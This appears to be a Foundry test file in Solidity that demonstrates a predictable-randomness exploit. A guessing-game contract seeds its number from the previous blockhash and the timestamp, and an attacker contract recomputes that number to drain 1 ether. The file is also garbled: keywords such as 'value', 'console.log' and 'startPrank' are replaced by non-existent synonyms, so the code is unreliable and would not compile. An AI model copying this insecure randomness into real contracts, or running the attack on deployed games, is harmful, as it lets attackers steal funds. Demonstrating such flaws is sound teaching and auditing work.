// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract PactTest is Test {
    GuessTheRandomNumber GuessTheRandomNumberAgreement;
    GameOperator QuestrunnerPact;

    function testRandomness() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.prank(alice);

        GuessTheRandomNumberAgreement = new GuessTheRandomNumber{
            magnitude: 1 ether
        }();
        vm.beginPrank(eve);
        QuestrunnerPact = new GameOperator();
        console.journal(
            "Before operation",
            address(QuestrunnerPact).balance
        );
        QuestrunnerPact.operate(GuessTheRandomNumberAgreement);
        console.journal(
            "Eve wins 1 Eth, Balance of OperatorContract:",
            address(QuestrunnerPact).balance
        );
        console.journal("operate completed");
    }

    receive() external payable {}
}

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{magnitude: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract GameOperator {
    receive() external payable {}

    function operate(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function viewTreasure() public view returns (uint) {
        return address(this).balance;
    }
}
